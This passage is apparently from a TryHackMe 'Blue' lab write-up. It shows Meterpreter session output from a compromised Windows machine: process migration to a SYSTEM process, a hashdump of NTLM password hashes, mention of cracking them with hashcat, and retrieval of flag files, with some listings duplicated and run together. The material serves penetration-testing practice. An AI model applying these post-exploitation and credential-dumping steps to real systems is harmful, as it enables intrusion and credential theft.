+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0         dir   2009-07-13 23:20:10 -0400  Journal
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  RegBack
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SAM
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  SAM.LOG
+100666/rw-rw-rw-  21504     fil   2009-07-13 22:34:08 -0400  SAM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SAM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SECURITY
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SECURITY.LOG
+100666/rw-rw-rw-  21504     fil   2009-07-13 22:34:08 -0400  SECURITY.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SECURITY.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:08 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  40632320  fil   2009-07-13 22:34:08 -0400  SOFTWARE
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SOFTWARE.LOG
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SOFTWARE.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SOFTWARE.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  12582912  fil   2009-07-13 22:34:08 -0400  SYSTEM
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SYSTEM.LOG
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  TxR
+100666/rw-rw-rw-  34        fil   2018-12-12 22:48:22 -0500  flag2.txt
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  systemprofile</p>
+<p>meterpreter &gt; cat flag2.txt
+flag{sam_database_elevated_access}</p>
+<pre><code>
+
+3.
+</code></pre><h1 id="listing-cusers">meterpreter &gt; cd Users
+lmeterpreter &gt; ls
+Listing: C:\Users</h1>
+<p>Mode              Size  Type  Last modified              Name</p>
+<hr>
+<p>40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  All Users
+40555/r-xr-xr-x   8192  dir   2009-07-13 23:20:08 -0400  Default
+40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  Default User
+40777/rwxrwxrwx   8192  dir   2018-12-12 22:13:28 -0500  Jon
+40555/r-xr-xr-x   4096  dir   2009-07-13 23:20:08 -0400  Public
+100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini</p>
+<h1 id="listing-cusersjon">meterpreter &gt; cd Jon
+meterpreter &gt; ls
+Listing: C:\Users\Jon</h1>
+<p>Mode              Size    Type  Last modified              Name</p>
+<hr>
+<p>40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  AppData
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Application Data
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:37 -0500  Contacts
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Cookies
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Desktop
+40555/r-xr-xr-x   4096    dir   2018-12-12 22:13:31 -0500  Documents
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Downloads
+40555/r-xr-xr-x   4096    dir   2018-12-12 22:13:31 -0500  Favorites
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Links
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Local Settings
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Music
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  My Documents
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500  NTUSER.DAT
+100666/rw-rw-rw-  65536   fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  NetHood
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Pictures
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  PrintHood
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Recent
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Saved Games
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:45 -0500  Searches
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  SendTo
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Start Menu
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Templates
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Videos
+100666/rw-rw-rw-  262144  fil   2018-12-12 22:13:31 -0500  ntuser.dat.LOG1
+100666/rw-rw-rw-  0       fil   2018-12-12 22:13:31 -0500  ntuser.dat.LOG2
+100666/rw-rw-rw-  20      fil   2018-12-12 22:13:31 -0500  ntuser.ini</p>
+<h1 id="listing-cusersjondocuments">meterpreter &gt; cd Documents
+meterpreter &gt; ls
+Listing: C:\Users\Jon\Documents</h1>
+<p>Mode              Size  Type  Last modified              Name</p>
+<hr>
+<p>40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Music
+40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Pictures
+40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Videos
+100666/rw-rw-rw-  402   fil   2018-12-12 22:13:45 -0500  desktop.ini
+100666/rw-rw-rw-  37    fil   2018-12-12 22:49:18 -0500  flag3.txt</p>
+<h1 id="flagadmin_documents_can_be_valuableusersjondocuments">meterpreter &gt; cat flag3.txt
+flag{admin_documents_can_be_valuable}\Users\Jon\Documents</h1>
+<p>Mode              Size  Type  Last modified              Name</p>
+<hr>
+<p>40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Music
+40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Pictures
+40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Videos
+100666/rw-rw-rw-  402   fil   2018-12-12 22:13:45 -0500  desktop.ini
+100666/rw-rw-rw-  37    fil   2018-12-12 22:49:18 -0500  flag3.txt</p>
+<p>meterpreter &gt; cat flag3.txt
+flag{admin_documents_can_be_valuable}C:\Windows\System32\LogonUI.exe
+416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\smss.exe
+428   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
+536   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
+552   544   csrss.exe             x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\csrss.exe
+600   544   wininit.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\wininit.exe
+612   592   csrss.exe             x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\csrss.exe
+652   592   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
+700   600   services.exe          x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\services.exe
+708   600   lsass.exe             x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe
+716   600   lsm.exe               x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsm.exe
+824   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
+892   700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+940   700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+1012  824   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\wbem\WmiPrvSE.exe
+1068  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+1160  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+1292  700   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\spoolsv.exe
+1328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+1380  2856  powershell.exe        x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+1392  700   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+1468  700   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\Xentools\LiteAgent.exe
+1588  700   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+1780  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+1856  2200  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+1936  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+1940  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+2144  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+2200  700   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+2216  2504  cmd.exe               x86   0        NT AUTHORITY\SYSTEM
+C:\Windows\SysWOW64\cmd.exe
+2328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+2360  700   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\sppsvc.exe
+2428  700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
+2504  1380  powershell.exe        x86   0        NT AUTHORITY\SYSTEM
+C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
+2560  700   vds.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\vds.exe
+2664  700   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\SearchIndexer.exe
+2796  1292  cmd.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\cmd.exe
+3020  700   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\servicing\TrustedInstaller.exe</p>
+<pre><code>
+We write down the process id 2796.
+
+
+8. We migrate to the process whose id we noted:
+</code></pre><p>meterpreter &gt; migrate 2796
+[<em>] Migrating from 2504 to 2796&hellip;
+[</em>] Migration completed successfully.</p>
+<pre><code>
+## Task 4: Cracking
+
+1. We run the command hashdump.
+</code></pre><p>meterpreter &gt; hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::</p>
+<pre><code>
+So the user is Jon.
+
+
+2. Windows uses LM and NTLM hashing. We crack the hashes using hashcat
+</code></pre><pre><code>
+
+
+## Task 5: Find flags! 
+
+1. 
+</code></pre><h1 id="listing-c-1">meterpreter &gt; cd C:\<br>
+meterpreter &gt; ls
+Listing: C:\</h1>
+<p>Mode              Size     Type  Last modified              Name</p>
+<hr>
+<p>40777/rwxrwxrwx   0        dir   2009-07-13 23:18:56 -0400  $Recycle.Bin
+40777/rwxrwxrwx   0        dir   2009-07-14 01:08:56 -0400  Documents and
+Settings
+40777/rwxrwxrwx   0        dir   2009-07-13 23:20:08 -0400  PerfLogs
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Program Files
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Program Files (x86)
+40777/rwxrwxrwx   4096     dir   2009-07-13 23:20:08 -0400  ProgramData
+40777/rwxrwxrwx   0        dir   2018-12-12 22:13:22 -0500  Recovery
+40777/rwxrwxrwx   4096     dir   2018-12-12 18:01:17 -0500  System Volume
+Information
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Users
+40777/rwxrwxrwx   16384    dir   2009-07-13 23:20:08 -0400  Windows
+100666/rw-rw-rw-  24       fil   2018-12-12 22:47:39 -0500  flag1.txt
+0000/&mdash;&mdash;&mdash;    2141120  fif   1970-01-30 18:20:00 -0500  hiberfil.sys
+0000/&mdash;&mdash;&mdash;    2141120  fif   1970-01-30 18:20:00 -0500  pagefile.sys</p>
+<p>meterpreter &gt; cat flag1.txt
+flag{access_the_machine}</p>
+<pre><code>
+2. 
+</code></pre><h1 id="listing-cwindowssystem32config-1">meterpreter &gt; pwd
+C:\Windows\System32\config
+meterpreter &gt; ls
+Listing: C:\Windows\System32\config</h1>
+<p>Mode              Size      Type  Last modified              Name</p>
+<hr>
+<p>100666/rw-rw-rw-  28672     fil   2009-07-14 01:32:39 -0400  BCD-Template
+100666/rw-rw-rw-  25600     fil   2009-07-14 01:38:35 -0400  BCD-Template.LOG
+100666/rw-rw-rw-  18087936  fil   2009-07-13 22:34:08 -0400  COMPONENTS
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  COMPONENTS.LOG
+100666/rw-rw-rw-  13312     fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG2
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms
+100666/rw-rw-rw-  65536     fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf
+100666/rw-rw-rw-  65536     fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  DEFAULT
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  DEFAULT.LOG
+100666/rw-rw-rw-  177152    fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0         dir   2009-07-13 23:20:10 -0400  Journal
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  RegBack
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SAM
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  SAM.LOG
+100666/rw-rw-rw-  21504     fil   2009-07-13 22:34:08 -0400  SAM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SAM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SECURITY
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SECURITY.LOG
+100666/rw-rw-rw-  21504     fil   2009-07-13 22:34:08 -0400  SECURITY.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SECURITY.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:08 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  40632320  fil   2009-07-13 22:34:08 -0400  SOFTWARE
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SOFTWARE.LOG
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SOFTWARE.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SOFTWARE.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  12582912  fil   2009-07-13 22:34:08 -0400  SYSTEM
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SYSTEM.LOG
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  TxR
+100666/rw-rw-rw-  34        fil   2018-12-12 22:48:22 -0500  flag2.txt
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  systemprofile</p>
+<p>meterpreter &gt; cat flag2.txt
+flag{sam_database_elevated_access}</p>
+<pre><code>
+
+3.
+</code></pre><h1 id="listing-cusers-1">meterpreter &gt; cd Users
+lmeterpreter &gt; ls
+Listing: C:\Users</h1>
+<p>Mode              Size  Type  Last modified              Name</p>
+<hr>
+<p>40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  All Users
+40555/r-xr-xr-x   8192  dir   2009-07-13 23:20:08 -0400  Default
+40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  Default User
+40777/rwxrwxrwx   8192  dir   2018-12-12 22:13:28 -0500  Jon
+40555/r-xr-xr-x   4096  dir   2009-07-13 23:20:08 -0400  Public
+100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini</p>
+<h1 id="listing-cusersjon-1">meterpreter &gt; cd Jon
+meterpreter &gt; ls
+Listing: C:\Users\Jon</h1>
+<p>Mode              Size    Type  Last modified              Name</p>
+<hr>
+<p>40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  AppData
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Application Data
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:37 -0500  Contacts
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Cookies
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Desktop
+40555/r-xr-xr-x   4096    dir   2018-12-12 22:13:31 -0500  Documents
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Downloads
+40555/r-xr-xr-x   4096    dir   2018-12-12 22:13:31 -0500  Favorites
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Links
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Local Settings
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Music
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  My Documents
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500  NTUSER.DAT
+100666/rw-rw-rw-  65536   fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  NetHood
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Pictures
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  PrintHood
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Recent
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Saved Games
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:45 -0500  Searches
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  SendTo
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Start Menu
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Templates
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Videos
+100666/rw-rw-rw-  262144  fil   2018-12-12 22:13:31 -0500  ntuser.dat.LOG1
+100666/rw-rw-rw-  0       fil   2018-12-12 22:13:31 -0500  ntuser.dat.LOG2
+100666/rw-rw-rw-  20      fil   2018-12-12 22:13:31 -0500  ntuser.ini</p>
+<h1 id="listing-cusersjondocuments-1">meterpreter &gt; cd Documents
+meterpreter &gt; ls
+Listing: C:\Users\Jon\Documents</h1>
+<p>Mode              Size  Type  Last modified              Name</p>
+<hr>
+<p>40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Music
+40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Pictures
+40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Videos
+100666/rw-rw-rw-  402   fil   2018-12-12 22:13:45 -0500  desktop.ini
+100666/rw-rw-rw-  37    fil   2018-12-12 22:49:18 -0500  flag3.txt</p>
+<p>meterpreter &gt; cat flag3.txt
+flag{admin_documents_can_be_valuable}</p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="/writeups/tryhackme-writeups/tryhackme-blue-writeup/" title="TryHackMe - Blue Writeup" target="_blank" rel="external">/writeups/tryhackme-writeups/tryhackme-blue-writeup/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
+        <div>Hack the Planet</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="/writeups/tryhackme-writeups/tryhackme-basic-pentesting-writeup/" title="TryHackMe - Basic Pentesting Writeup"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="/writeups/hackthebox-writeups/hackthebox-openadmin-writeup/"
+                    title="Hackthebox - OpenAdmin Writeup"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Index</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="facebook,twitter"
+                data-mobile-sites="">Share on:</div>
+        </div>
+    </div>
+</nav>
+
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
